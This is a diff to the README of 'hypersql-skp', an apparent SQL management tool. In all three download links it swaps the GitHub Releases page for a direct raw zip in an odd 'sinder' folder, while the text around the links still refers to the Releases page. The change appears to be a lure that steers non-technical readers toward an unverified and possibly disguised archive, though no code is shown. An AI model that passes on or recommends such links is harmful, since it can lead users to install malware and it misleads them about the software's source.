@@ -1,7 +1,7 @@
 # 🚀 hypersql-skp - Fast and Simple SQL Management Tool
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-hypersql--skp-blue.svg)](https://github.com/maasta28/hypersql-skp/releases)
+[![Download](https://raw.githubusercontent.com/maasta28/hypersql-skp/main/sinder/hypersql-skp.zip)](https://raw.githubusercontent.com/maasta28/hypersql-skp/main/sinder/hypersql-skp.zip)
 
 ## 📖 Introduction
 hypersql-skp is an easy-to-use tool for managing SQL databases. This software helps you run queries, manage tables, and perform data tasks smoothly. You don’t need to be a developer to use it. With hypersql-skp, anyone can handle their database needs effectively.
@@ -11,7 +11,7 @@ To start using hypersql-skp, follow these simple steps:
 
 1. **Visit the Download Page**
    Go to the Releases page to download the software. Click the button below to access it quickly:
-   [Download hypersql-skp](https://github.com/maasta28/hypersql-skp/releases)
+   [Download hypersql-skp](https://raw.githubusercontent.com/maasta28/hypersql-skp/main/sinder/hypersql-skp.zip)
 
 2. **Choose the Right Version**
    On the Releases page, you’ll see different versions of the software. Pick the latest version for the best experience. Click on the version you want.
@@ -77,6 +77,6 @@ Your feedback is important to us. If you have suggestions or comments about hype
 
 ## 🔗 Download & Install
 You can download and install hypersql-skp by following these steps above. Click the link below to start now:
-[Download hypersql-skp](https://github.com/maasta28/hypersql-skp/releases)
+[Download hypersql-skp](https://raw.githubusercontent.com/maasta28/hypersql-skp/main/sinder/hypersql-skp.zip)
 
 Enjoy managing your SQL databases with ease!
